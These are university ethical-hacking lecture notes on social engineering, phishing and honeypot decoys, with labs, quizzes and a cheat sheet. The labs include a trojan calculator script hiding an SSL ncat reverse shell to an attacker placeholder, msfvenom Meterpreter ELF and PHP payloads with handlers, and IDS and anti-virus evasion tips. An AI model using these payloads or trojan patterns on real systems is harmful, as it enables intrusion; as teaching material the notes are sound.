# Week 4 — Social Engineering, Deception & Decoys

> **Module:** UOP M31880 Ethical Hacking
> **Lecturer:** Tobi Fajana
> **Topic:** Social Engineering, Deception, and Decoys

---

## Table of Contents

1. [Recap — Penetration Testing Fundamentals](#1-recap--penetration-testing-fundamentals)
2. [What Is Social Engineering?](#2-what-is-social-engineering)
3. [Why Are Humans Vulnerable?](#3-why-are-humans-vulnerable)
4. [Phases of Social Engineering](#4-phases-of-social-engineering)
5. [Types of Social Engineering Attacks](#5-types-of-social-engineering-attacks)
6. [In-Person Techniques](#6-in-person-techniques)
7. [Computer-Based Techniques](#7-computer-based-techniques)
8. [Insider Threats](#8-insider-threats)
9. [Intelligent Password Guessing](#9-intelligent-password-guessing)
10. [Deception — Defending with Decoys](#10-deception--defending-with-decoys)
11. [Lab — Spear Phishing & Reverse Shells](#11-lab--spear-phishing--reverse-shells)
12. [Lab — Payload Generation with MSFvenom](#12-lab--payload-generation-with-msfvenom)
13. [Lab — Deception & Counter-Deception](#13-lab--deception--counter-deception)
14. [Practice Questions](#14-practice-questions)
15. [Cheat Sheet](#15-cheat-sheet)
16. [Recommended Reading](#16-recommended-reading)

---

## 1. Recap — Penetration Testing Fundamentals

Before diving into social engineering, let's recap core concepts:

| Concept | Definition |
|---|---|
| **Penetration Testing** | Continuous process of identifying, analysing, exploiting, and recommending fixes for vulnerabilities |
| **Timeframe** | Usually conducted within a fixed window (e.g., 1 month) |
| **Black Box** | No prior knowledge of the target |
| **White Box** | Full disclosure — tester has complete information |
| **Grey Box** | Mixed disclosure — most common in practice |

### How Do We Identify Vulnerabilities?

Think about how data flows through a system:

| Data Lifecycle | Attack Vectors |
|---|---|
| **Stored** | Memory, Database, File system, Cloud, Access Control, **People** |
| **Processed** | Computer Architecture, Memory, Applications, **People** |
| **Transmitted** | Encryption, Medium, Protocols, **People** |

Notice the common factor: **People** appear at every stage. This is exactly why social engineering is so effective.

---

## 2. What Is Social Engineering?

Social engineering is the art of manipulating people into performing actions or disclosing confidential information.

It takes two main forms:

| Form | Description | Example |
|---|---|---|
| **Deception** | Convincing people to disclose sensitive information | Tricking someone into revealing their password |
| **Manipulation** | Getting people to take actions that compromise security | Installing malware, clicking phishing links |

> **Key Insight:** The most sophisticated firewall in the world cannot protect against a user who willingly hands over their credentials.

---

## 3. Why Are Humans Vulnerable?

Organisations are targeted because:

- **Trust** — People naturally want to be helpful and cooperative
- **Lack of training** — Most companies don't properly train (or re-train) employees
- **Information availability** — Assets and data are often readily accessible
- **Inconsistent policies** — Large companies have disparate units with differing security policies
- **Policy gaps** — Many organisations still lack security policies entirely
- **Awareness gaps** — Even when policies exist, are employees aware of them?

### Common Contributing Factors to Attacks

- Weak passwords
- Unpatched software versions
- Improper input sanitisation in software
- Human error and social engineering susceptibility

---

## 4. Phases of Social Engineering

A social engineering attack typically follows these phases:

```
┌─────────────────┐
│  1. Research     │  ← Gather information about the target
├─────────────────┤
│  2. Develop      │  ← Build trust / create a pretext
│     Rapport      │
├─────────────────┤
│  3. Exploit      │  ← Execute the attack
│     Trust        │
├─────────────────┤
│  4. Utilise      │  ← Use obtained information / access
│     Information  │
└─────────────────┘
```

---

## 5. Types of Social Engineering Attacks

### Overview Table

| Attack Type | Description |
|---|---|
| **Spear Phishing** | Targeting a **specific** company or individual with crafted messages |
| **Net Phishing** | Targeting a **broad group** or random people (spray and pray) |
| **Pretexting** | Fabricating a scenario to trick victims into divulging personal information |
| **Blackmail / Intimidation** | Using information or force to compel the victim |
| **Baiting** | Tricking or enticing the victim to reveal info or take an action |
| **Tailgating / Piggybacking** | Following an authorised person into a restricted area |
| **Vishing** | Using **phone calls** to scam victims into divulging information |
| **Smishing** | Using **text messages** to lure victims into clicking malicious links |
| **Impersonation** | Pretending to be a trusted contact or authority figure |

### Key Distinctions

- **Spear phishing** vs **Net phishing**: Spear = targeted at specific individuals/companies; Net = broad, random targets
- **Vishing** vs **Smishing**: Vishing = voice/phone calls; Smishing = SMS/text messages
- **Tailgating** vs **Piggybacking**: Often used interchangeably — both involve following someone into a restricted area

---

## 6. In-Person Techniques

### Shoulder Surfing

Watching someone as they enter sensitive information:
- Observing passwords, PINs, or logon names being typed
- Tools: binoculars, telescopes, phone cameras
- Knowing key positions and common letter substitutions (e.g., `s` → `$`, `a` → `@`)

**Prevention:**
- Don't type passwords when someone is nearby
- Be cautious of people on phones near you (they could be recording)
- Position monitors to face away from doors and entryways
- Change passwords immediately if you suspect observation

### Piggybacking / Tailgating

Closely following an authorised person through a secured entrance:
- Attacker watches authorised personnel enter an area
- Quickly joins them at the security entrance
- Exploits people's desire to be polite and helpful
- May wear a fake badge or security card

**Prevention:**
- Use turnstiles and mantraps
- Train personnel to challenge/report strangers
- Never hold secured doors for anyone — even people you know
- Require all employees to use secure access cards

### Dumpster Diving

Searching through rubbish for useful information:
- Documents, printouts, sticky notes with passwords
- University example: Does the cleaner understand confidential waste?

### Eavesdropping

Listening to private conversations:
- Can be in-person or remote using technology
- Phone conversations, meetings, casual discussions

---

## 7. Computer-Based Techniques

| Technique | Description |
|---|---|
| **Spam** | Mass unsolicited messages (the "shotgun" approach) |
| **Phishing** | Spoofed emails from seemingly legitimate sources directing users to fake websites |
| **Spear-Phishing** | Targeted phishing specific to an organisation or individual |
| **Chat-Based** | Building personal relationships via online chat to extract info |
| **Pop-ups** | Fake browser pages, embedded JavaScript, man-in-the-browser attacks |

### Phishing In Detail

- Emails appear to come from legitimate sources
- Direct users to spoofed websites
- Spear-phishing emails are personalised to the target organisation/user
- May include official logos, signatures, and fake support numbers

### Social Networking Exploitation

- LinkedIn and Facebook provide a wealth of information for attackers
- Job titles, company structure, email formats, personal details
- "If I look like I belong, what damage can I do? What data could I obtain?"

---

## 8. Insider Threats

Insiders pose a unique and dangerous threat:

| Type | Motivation |
|---|---|
| **Malicious / Disgruntled** | Revenge, financial gain, ideological reasons |
| **Accidental / Careless** | Negligence, lack of training, human error |
| **Spying** | Corporate or state-sponsored espionage |
| **Altruistic** | Whistleblowing — intentions may be good but methods risky |

---

## 9. Intelligent Password Guessing

Instead of brute-forcing, attackers use gathered intelligence:

### Information Gathering for Passwords
- Dates of birth, important dates, family dates in 4/6 digit PINs
- Compile wordlists from websites and social media
- Use active information gathering methods (OSINT)
- Try default passwords for known systems

### Why Brute Force Fails
- Uncertain success rate
- Account lockouts and detection
- IP blacklisting
- Honeypots that trap attackers

---

## 10. Deception — Defending with Decoys

Deception is also a **defensive** strategy. Defenders can use decoys to detect, delay, and confuse attackers:

### Types of Decoys

| Decoy Type | Description |
|---|---|
| **Honeypot** | A system that simulates network services on specific ports to lure and trap attackers |
| **Honeynet** | A network of honeypots designed to appear as a real network |
| **Honey Users** | Fake user accounts that trigger alerts when accessed |
| **Honey Tokens** | Fake data (files, credentials, API keys) that alert when used |
| **Honeyfiles** | Decoy files (fake configs, login pages, credentials) designed to trick attackers or trigger alerts |

### Obfuscation

Defenders can also mislead attackers by:
- Switching port numbers for services
- Renaming plugins and directories
- Modifying version strings
- Hiding real services behind deceptive configurations

---

## 11. Lab — Spear Phishing & Reverse Shells

### Lab Environment Setup

1. Download the **attackbox** machine from osboxes.org (credentials: `osboxes.org:osboxes.org`)
2. Download the **EH machine** (vulnerable target) from Moodle
3. Import both `.ova` files into VirtualBox with default settings
4. Configure networking:
   - **Adapter 1:** NAT
   - **Adapter 2:** Host-only (`vboxnet0`)
5. Create the `vboxnet0` network if needed: **Tools → Network Manager → Host-only networks → Create**
6. Install tools:
   ```bash
   sudo apt update && sudo apt install nmap ncat gobuster
   ```
7. Verify connectivity:
   ```bash
   nmap -sV -T5 192.168.56.1/24
   ```

### Step 1 — Information Gathering

Before crafting a phishing attack, gather intelligence:

**Find user profiles and email addresses:**
```bash
# WordPress user enumeration via REST API
curl http://<target-ip>/?rest_route=/wp/v2/users

# Author brute force
curl http://<target-ip>/?author=1

# Automated email harvesting
theharvester -d <domain> -b all
```

**Check mail server (MX records):**
```bash
host <domain>
# Important: some mail servers have phishing protections
```

**Discover contact forms and input points:**
```bash
# Download wordlist
wget https://github.com/daviddias/node-dirbuster/blob/master/lists/directory-list-2.3-medium.txt

# Directory scan
gobuster dir -u http://<target-ip> -w directory-list-2.3-medium.txt
```

**Fingerprint the target device:**
```bash
# Full scan with OS detection, service versions, all ports
nmap -A <target-ip> -p-
```

### Step 2 — Understanding Shells

| Shell Type | Description | When to Use |
|---|---|---|
| **Bind Shell** | Victim opens a port, attacker connects to it | When the target has a public IP and no strict firewall |
| **Reverse Shell** | Victim connects back to the attacker's listener | More reliable — bypasses firewalls, works with private IPs |

> **Why reverse shells are preferred:** Most targets have private IPs and firewall rules that block inbound connections. A reverse shell initiates the connection *outward* from the target, which is often allowed.

### Step 3 — Creating a Payload

We'll embed a reverse shell into a legitimate-looking script:

**On the attack machine — Terminal 1 (Listener):**
```bash
# Set up an SSL-encrypted listener
ncat --ssl -nvlp 8080
# Keep this terminal open!
```

**On the attack machine — Terminal 2 (Payload):**
```bash
vi calculator.sh
```

Create a "calculator" script with a hidden reverse shell:
```bash
#!/bin/bash

# Take user Input
echo "Enter Two numbers : "
ncat <ATTACKER-IP> 8080 --ssl -e /bin/bash    # ← MALICIOUS LINE
read a
read b

# Input type of operation
echo "Enter Choice :"
echo "1. Addition"
echo "2. Subtraction"
echo "3. Multiplication"
echo "4. Division"
read ch

case $ch in
  1) res=$(echo "$a + $b" | bc) ;;
  2) res=$(echo "$a - $b" | bc) ;;
  3) res=$(echo "$a * $b" | bc) ;;
  4) res=$(echo "scale=2; $a / $b" | bc) ;;
esac
echo "Result : $res"
```

> **Note:** We use SSL encryption (`--ssl`) to:
> - Prevent traffic interception or hijacking
> - Evade traditional Intrusion Detection Systems (IDS)
> - Make traffic appear like legitimate HTTPS

### Step 4 — Delivering the Payload

Upload `calculator.sh` via the target's **`/maintenance/contact`** page:
- Use a believable name and email address
- Write convincing text based on your recon
- Attach the malicious file

If successful, you'll receive a reverse shell on Terminal 1.

---

## 12. Lab — Payload Generation with MSFvenom

### Linux ELF Payload

Generate a standalone Linux executable:

```bash
msfvenom -p linux/x64/meterpreter_reverse_tcp \
  LHOST=<ATTACKER-IP> LPORT=5555 \
  -f elf > shell.elf
```

Set up a Meterpreter listener:
```bash
msfconsole
use multi/handler
set lhost <ATTACKER-IP>
set lport 5555
set payload linux/x64/meterpreter_reverse_tcp
run
```

### PHP Payload

For web server exploitation — useful if the server saves uploaded files:

```bash
msfvenom -p linux/x64/meterpreter_reverse_tcp \
  LHOST=<ATTACKER-IP> LPORT=5556 \
  -f php > file.php
```

Set up the listener:
```bash
msfconsole
use multi/handler
set lhost <ATTACKER-IP>
set lport 5556
run
```

> **Tip:** Do a directory scan on the `/maintenance` page to find where uploaded files are stored, then trigger execution via the browser.

### Anti-Virus Evasion Techniques

| Technique | Effective? | Why |
|---|---|---|
| Generate dynamic payloads | Yes | Different signature each time |
| Break trojan into encrypted pieces | Yes | AV can't analyse encrypted fragments |
| Meterpreter (DLL injection) | Partially | Operates in memory, but modern AV detects it |
| Rename `.exe` to `.txt` | **No** | AV doesn't rely solely on file names/extensions |
| Add NOPs before shellcode | **No** | AV scanners handle NOP sleds |

---

## 13. Lab — Deception & Counter-Deception

### Identifying Obfuscation

Attackers may encounter deceptive configurations:

```bash
# Run a WPScan — notice hidden plugin versions
wpscan --url http://<target-ip>

# Check the actual version via readme.txt
# Visit: http://<target-ip>/blog/wp-content/plugins/wp-easycart/readme.txt
```

### SMTP Honeypot Example

Some organisations deploy SMTP honeypots to catch automated phishing campaigns:

```bash
# Connect to an SMTP honeypot
nc smtp.example.com 25
# Attackers use VRFY to validate email addresses
# A honeypot will respond to ALL addresses, trapping the attacker
```

### Honeyfiles & Honeytokens

Examples of deceptive files/data:
- Fake login pages that log attacker credentials
- Decoy configuration files with canary tokens
- Fake usernames/passwords that trigger alerts when used
- Hidden admin paths that redirect to monitoring systems

### Advanced Exercises

1. **WordPress Deception:** Install the Wordfence plugin, create fake login pages and hidden admin paths
2. **SSH Honeypot:** Set up [Cowrie](https://github.com/cowrie/cowrie) — an SSH/Telnet honeypot
   - [Installation docs](https://docs.cowrie.org/en/latest/INSTALL.html)

---

## 14. Practice Questions

**20 MCQs based on Week 4 material. Try them before checking the answers.**

---

**Q1.** Which technique involves targeting a specific company or individual by carefully crafting deceptive messages or scenarios?

- A. Net Phishing
- B. Baiting
- C. Spear Phishing
- D. Tailgating

<details><summary>Answer</summary>C. Spear Phishing</details>

---

**Q2.** How does net phishing differ from spear phishing?

- A. It uses text messages to lure victims
- B. It pretends to be a trusted contact
- C. It targets a broader group or random people
- D. It targets a specific individual or company

<details><summary>Answer</summary>C. It targets a broader group or random people</details>

---

**Q3.** What social engineering method involves fabricating a scenario to trick victims into divulging personal information?

- A. Vishing
- B. Tailgating
- C. Pretexting
- D. Blackmail

<details><summary>Answer</summary>C. Pretexting</details>

---

**Q4.** Which tactic involves threatening or coercing a victim to provide information or perform a specific action?

- A. Tailgating
- B. Smishing
- C. Pretexting
- D. Blackmail / Intimidation

<details><summary>Answer</summary>D. Blackmail / Intimidation</details>

---

**Q5.** What is the primary goal of baiting in social engineering attacks?

- A. Pretending to be a trusted contact
- B. Following authorised individuals into restricted areas
- C. Tricking or enticing the victim to reveal or do something
- D. Using a phone call to deceive a victim

<details><summary>Answer</summary>C. Tricking or enticing the victim to reveal or do something</details>

---

**Q6.** What is the main strategy employed in tailgating or piggybacking attacks?

- A. Sending phishing emails to random individuals
- B. Creating a fabricated story to deceive the victim
- C. Using a malicious link to steal personal information
- D. Following an authorised person into a restricted area or system

<details><summary>Answer</summary>D. Following an authorised person into a restricted area or system</details>

---

**Q7.** What does vishing rely on to successfully deceive victims into providing sensitive information?

- A. Malicious links in text messages
- B. Fabricated email addresses
- C. Physical documents
- D. Phone calls posing as a legitimate authority

<details><summary>Answer</summary>D. Phone calls posing as a legitimate authority</details>

---

**Q8.** What makes smishing different from other phishing techniques?

- A. It impersonates trusted contacts
- B. It relies on text messages to lure victims
- C. It employs physical devices to bait victims
- D. It uses email messages for communication

<details><summary>Answer</summary>B. It relies on text messages to lure victims</details>

---

**Q9.** Which social engineering method involves pretending to be a trusted contact or authority?

- A. Smishing
- B. Tailgating
- C. Impersonation
- D. Vishing

<details><summary>Answer</summary>C. Impersonation</details>

---

**Q10.** Which of the following techniques/tools CANNOT be used for remotely retrieving email addresses for a phishing campaign?

- A. Google Dorking
- B. Directory scanning or web crawling
- C. `find`
- D. SMTP VRFY command
- E. The Harvester

<details><summary>Answer</summary>C. `find` — it's a local filesystem command, not a remote enumeration tool</details>

---

**Q11.** The secretary of XYZ receives a phone call from a person falsely claiming to represent XYZ's bank, requesting sensitive information. Which attack has occurred?

- A. Social engineering
- B. Baiting
- C. Phishing
- D. Impersonation
- E. War dialling

<details><summary>Answer</summary>A. Social engineering — this is the overarching category; the specific technique is vishing/impersonation, but the broadest correct answer is social engineering</details>

---

**Q12.** Sam follows John and observes the contents of his laptop screen. What technique is this?

- A. Persistence and patience
- B. Follow around technique
- C. Tailgating
- D. Spying
- E. Shoulder surfing

<details><summary>Answer</summary>E. Shoulder surfing</details>

---

**Q13.** What is a 'honeypot' in network security?

- A. Software used to detect faults in the network infrastructure
- B. A vulnerability in software that can be exploited by hackers
- C. A tool that simulates one or more network services on your computer's ports
- D. A type of firewall used to block incoming attacks

<details><summary>Answer</summary>C. A tool that simulates one or more network services on your computer's ports</details>

---

**Q14.** What does the DNS MX record indicate?

- A. Unidentified addresses
- B. Mail servers
- C. Addresses
- D. Multiple DNS servers
- E. IoT Devices

<details><summary>Answer</summary>B. Mail servers</details>

---

**Q15.** Which of the following is NOT a typical contributing factor to cybersecurity attacks?

- A. Honeypots
- B. Unpatched software versions
- C. Improper input sanitisation
- D. Weak passwords
- E. Humans

<details><summary>Answer</summary>A. Honeypots — they are a defensive measure, not a contributing factor to attacks</details>

---

**Q16.** Which tools are NOT helpful for scanning/indexing web server directories? (Select 2)

- A. `nslookup`
- B. `exiftool`
- C. `lynx`
- D. `gobuster`
- E. `dirb`

<details><summary>Answer</summary>A. `nslookup` (DNS tool) and B. `exiftool` (image metadata tool) — neither scans web directories</details>

---

**Q17.** Which techniques are INEFFECTIVE for disguising a trojan against anti-virus? (Select 3)

- A. Generate dynamic payloads
- B. Use Meterpreter (DLL injection in memory)
- C. Add NOPs before the shellcode
- D. Break trojan into encrypted pieces
- E. Rename file and change extension from .exe to .txt

<details><summary>Answer</summary>B, C, and E — Meterpreter is detectable by modern AV, NOPs don't confuse AV, and renaming extensions doesn't evade hash-based detection</details>

---

**Q18.** An attacker uses this URL to steal cookies:
`http://site.net/search.pl?text=<script>alert(document.cookie)</script>`

Which countermeasure protects against this?

- A. Force HTTPS on all websites
- B. Change database table names to random names
- C. Implement a firewall with port-based restrictions
- D. Replace `<` and `>` with `&lt;` and `&gt;` using server scripts
- E. Limit database permissions

<details><summary>Answer</summary>D. Replace `<` and `>` with HTML entities — this is XSS prevention through output encoding</details>

---

**Q19.** Which technique is most effective for defending against social engineering attacks?

- A. Implement written security policies and conduct regular security awareness training/drills
- B. Implement policies, conduct secret assessments, and terminate complacent employees
- C. Provide advanced penetration testing training for all employees
- D. Develop a paranoid security culture
- E. Monitor all employee behaviour and communication

<details><summary>Answer</summary>A. Implement written security policies and conduct regular security awareness training/drills</details>

---

**Q20.** An employee receives a phishing email with official logos and a fake IT support number, requesting credentials for a "software upgrade." Which technique is this and what should be done?

- A. Pretexting; remind employees not to share passwords
- B. Vishing; call employees to verify requests
- C. Smishing; switch to secure text platforms
- D. Spear phishing; update policies and provide security training

<details><summary>Answer</summary>D. Spear phishing; update policies and provide security training</details>

---

## 15. Cheat Sheet

### Social Engineering Types — Quick Reference

| Attack | Channel | Target | Key Word |
|---|---|---|---|
| Spear Phishing | Email | Specific person/org | "Targeted" |
| Net Phishing | Email | Random/broad group | "Spray & pray" |
| Pretexting | Any | Specific person | "Fake scenario" |
| Baiting | Physical/Digital | Anyone | "Enticement" |
| Tailgating | Physical | Building access | "Follow through door" |
| Vishing | Phone call | Anyone | "Voice" |
| Smishing | SMS/Text | Anyone | "Text message" |
| Impersonation | Any | Specific person | "Pretend to be someone" |
| Blackmail | Any | Specific person | "Coercion" |

### Key Commands

```bash
# === Information Gathering ===
theharvester -d <domain> -b all         # Harvest emails
host <domain>                           # Check MX records
gobuster dir -u http://<ip> -w <list>   # Directory scan
nmap -A <ip> -p-                        # Full port + OS scan

# === Reverse Shell (ncat with SSL) ===
ncat --ssl -nvlp 8080                   # Listener (attacker)
ncat <attacker-ip> 8080 --ssl -e /bin/bash  # Payload (victim)

# === MSFvenom Payloads ===
# Linux ELF binary
msfvenom -p linux/x64/meterpreter_reverse_tcp \
  LHOST=<ip> LPORT=5555 -f elf > shell.elf

# PHP web shell
msfvenom -p linux/x64/meterpreter_reverse_tcp \
  LHOST=<ip> LPORT=5556 -f php > file.php

# === Metasploit Handler ===
msfconsole
use multi/handler
set lhost <ip>
set lport <port>
set payload linux/x64/meterpreter_reverse_tcp
run

# === Deception Detection ===
wpscan --url http://<ip>                # Check for hidden plugins
# Check: /wp-content/plugins/<name>/readme.txt
nc smtp.example.com 25                  # Test SMTP honeypot
```

### Defence Checklist

- [ ] Regular security awareness training
- [ ] Written security policies distributed to all employees
- [ ] Challenge unknown individuals in secure areas
- [ ] Use turnstiles / mantraps at access points
- [ ] Position screens away from public view
- [ ] Implement output encoding (prevent XSS)
- [ ] Deploy honeypots and honeytokens
- [ ] Monitor for canary token triggers
- [ ] Use SSL/TLS for all communications

---

## 16. Recommended Reading

- **Phishing Exposed** — Lance James
- **The Art of Deception** — Kevin Mitnick
- **No Tech Hacking: A Guide to Social Engineering, Dumpster Diving, and Shoulder Surfing** — Johnny Long
- **The Hacker Playbook 3: Practical Guide to Penetration Testing** — Peter Kim
- **How to Win Friends and Influence People** — Dale Carnegie
- **Exploiting Software: How To Break Code** — Gary McGraw & Greg Hoglund

---

*Week 4 of 12 — UOP M31880 Ethical Hacking*
